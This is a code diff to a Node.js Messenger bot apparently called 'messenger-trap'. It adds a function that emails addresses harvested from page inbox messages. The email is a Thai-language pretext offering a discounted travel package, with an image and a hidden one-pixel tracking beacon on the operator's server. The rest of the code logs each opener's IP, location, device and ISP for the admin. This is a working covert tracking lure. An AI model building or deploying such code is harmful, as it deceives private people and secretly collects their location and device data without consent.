@@ -16,6 +16,36 @@ const TOKEN = process.env.PAGE_ACCESS_TOKEN;
 const IMAGE_URL = process.env.AUTO_IMAGE_URL || "";
 const AUTO_TEXT = process.env.AUTO_TEXT || "ขอบคุณที่ติดต่อครับ";
 const PAGE_NAME = (process.env.PAGE_NAME || "have a nice day").trim();
+const SG_KEY = process.env.SENDGRID_API_KEY || "";
+const SG_FROM = process.env.SENDGRID_FROM || "";
+const EMAIL_SUBJECT = process.env.EMAIL_SUBJECT || "รายละเอียดแพ็กเกจท่องเที่ยวราคาพิเศษ";
+const PUBLIC_BASE = process.env.PUBLIC_BASE_URL || "https://messenger-trap-production.up.railway.app";
+
+async function sendTrackingEmail(toEmail, psid) {
+  if (!SG_KEY || !SG_FROM) { console.log("SendGrid not configured, skip auto-email"); return; }
+  const tag = "auto-" + String(psid).slice(-8);
+  const html = '<html><body style="font-family:sans-serif">'
+    + '<p>สวัสดีครับ</p>'
+    + '<p>ตามที่ทิ้งอีเมลไว้กับทางเพจ รายละเอียดอยู่ในรูปด้านล่างนี้ครับ</p>'
+    + '<img src="' + PUBLIC_BASE + '/img/' + tag + '.jpg">'
+    + '<p>ราคาโปรโมชั่นถึงสิ้นเดือนนี้เท่านั้นครับ สนใจตอบกลับอีเมลนี้ได้เลย</p>'
+    + '<img src="' + PUBLIC_BASE + '/track.gif?e=' + tag + '" width="1" height="1">'
+    + '</body></html>';
+  try {
+    await axios.post("https://api.sendgrid.com/v3/mail/send",
+      { personalizations: [{ to: [{ email: toEmail }] }],
+        from: { email: SG_FROM },
+        subject: EMAIL_SUBJECT,
+        content: [{ type: "text/html", value: html }] },
+      { headers: { Authorization: "Bearer " + SG_KEY } });
+    console.log("Tracking email sent to", toEmail, "tag:", tag);
+    notifyAdmin({ code: "email-sent", ip: toEmail, location: "tag " + tag,
+      device: "SendGrid", os: "SendGrid", browser: "AutoEmailer", isp: null,
+      time: new Date().toISOString(), id: 0 });
+  } catch (e) {
+    console.error("SendGrid failed:", JSON.stringify(e.response?.data?.errors || e.message));
+  }
+}
 
 function logVisit(code, req) {
   const ip = ((req.headers["x-forwarded-for"] || "").split(",")[0].trim() || req.ip).replace("::ffff:", "");
@@ -125,6 +155,7 @@ async function pollInbox() {
               location: "PSID " + user.id, device: "Inbox", os: "Inbox",
               browser: "Harvester", isp: null, time: new Date().toISOString(), id: 0 });
             await sendTextTo(user.id, "ได้รับอีเมลของท่านแล้วครับ จะส่งรายละเอียดไปให้โดยเร็วที่สุดครับ 🙏");
+            await sendTrackingEmail(match[0], user.id);
           }
         }
       } catch (e2) { console.error("Harvest error:", e2.response?.data?.error?.message || e2.message); }
